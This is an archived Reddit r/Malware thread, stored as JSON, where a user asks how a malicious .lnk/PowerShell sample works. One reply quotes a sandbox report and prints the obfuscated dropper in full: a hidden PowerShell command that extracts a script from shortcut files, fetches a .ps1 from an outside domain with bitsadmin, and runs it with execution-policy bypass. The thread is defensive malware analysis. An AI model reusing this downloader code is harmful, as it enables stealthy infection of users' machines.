@@ -1,0 +1,55 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "[removed]",
+        "title": "How does this malware work? A new one we just got today using a powershell script that doesn't make sense to me.",
+        "score": 1,
+        "id": "98uy4p",
+        "commsNum": 3,
+        "timeStamp": "2018/08/20-09:12:54",
+        "author_name": "_-_-_--___----_____-",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 3,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/98uy4p/how_does_this_malware_work_a_new_one_we_just_got/"
+    },
+    "posts": {
+        "e4ok1u4": {
+            "comment": "Where does the other indicator come from? Why extract powershell?\n\nThe .lnk file only had the first block of code.",
+            "timeStamp": "2018/08/23-00:46:55",
+            "id": "e4ok1u4",
+            "is_submitter": false,
+            "link_id": "t3_98uy4p",
+            "parent_id": "t1_e4mzfba",
+            "score": 1,
+            "stickied": false,
+            "author_name": "[deleted]"
+        },
+        "e4mzfba": {
+            "comment": "The hybrid report lays it out for you:\n\n&gt;Process \"powershell.exe\" with commandline \"-ep bypass -c $j=\"powershell -win hi\"d\"den -c findstr /s dopretane $env:userprofile\\*.lnk &gt; $env:userprofile\\Downloads\\sent\".\"ps1; &amp; $env:userprofile\\Downloads\\sent\".\"ps1\"; start-process $j\"\n\nfindstr is used to extract PowerShell that is redirected to send.ps1, this is presumably executing the other indicator in the report that is downloading and executing a file using bitsadmin:\n\n&gt;\";$n7=$env:appdata; $8o= -join ((65..90) + (97..122) | Get-Random -Count 14 | % {[char]$_}); $a7op=\"dopretane\";; $ss0=(Get-WmiObject Win32_ComputerSystemProduct).UUID;$a7op=\"dopretane\";; $path = $n7+'\\'+$ss0; $h=$path+'\\d'; $p2='ps://';$a7op=\"dopretane\";; If(!(test-path $path)){ New-Item -ItemType Directory -Force -Path $path;};$a7op=\"dopretane\";; $p1='htt'; $a7op=\"dopretane\";; $ib6='/C echo 1 &gt; '+$h+' &amp; bits'+'a'+'dm'+'in /transfer dopretane /do'+'wnl'+'oad /priority FOREGROUND \"'+$p1+''+$p2+'kyle'+'mendez'+'.c'+'om/le'+'m/dez\" '+$path+'\\'+$8o+'.ps1 &amp; del '+$h+' &amp; exit';$a7op=\"dopretane\";; start-process -wiNdowStylE HiDden cmd.exe $ib6;$a7op=\"dopretane\";; $e=1;$a7op=\"dopretane\";; Start-Sleep -s 3;$a7op=\"dopretane\";; $p2='powe';$a7op=\"dopretane\";; while($e -eq 1){If(test-path $h){Start-Sleep -s 3}else{$e=2}};$a7op=\"dopretane\";; $p1='ell';$a7op=\"dopretane\";; $ib6='/C '+$p2+'rsh'+$p1+' -nop -Exe ByPass -File '+$path+'\\'+$8o+'.ps1 &amp; exit';$a7op=\"dopretane\";; start-process -wIndOwsTYLe hIDDen cmd.e\" (Indicator: \"win32_computersystem\"; File: \"81YFC503-complete-details.lnk.bin\")\n",
+            "timeStamp": "2018/08/22-09:02:57",
+            "id": "e4mzfba",
+            "is_submitter": false,
+            "link_id": "t3_98uy4p",
+            "parent_id": "t3_98uy4p",
+            "score": 1,
+            "stickied": false,
+            "author_name": "jershmagersh"
+        },
+        "e4iuwj7": {
+            "comment": "It looks like you are posting a question, possibly looking for technical support. \n\nThis subreddit\u2019s purpose is to discuss malware internals and technical details. *This is NOT a place for help with malware removal or various other end-user questions. Please redirect questions related to malware removal to /r/Antivirus or /r/techsupport. Ransomware related questions can be directed to /r/ransomware*\n\nIf this was removed in error, please message the moderators - we love reading quality content just as much as you do!\n\n\n*I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Malware) if you have any questions or concerns.*",
+            "timeStamp": "2018/08/20-09:12:54",
+            "id": "e4iuwj7",
+            "is_submitter": false,
+            "link_id": "t3_98uy4p",
+            "parent_id": "t3_98uy4p",
+            "score": 1,
+            "stickied": false,
+            "author_name": "AutoModerator"
+        }
+    }
+}
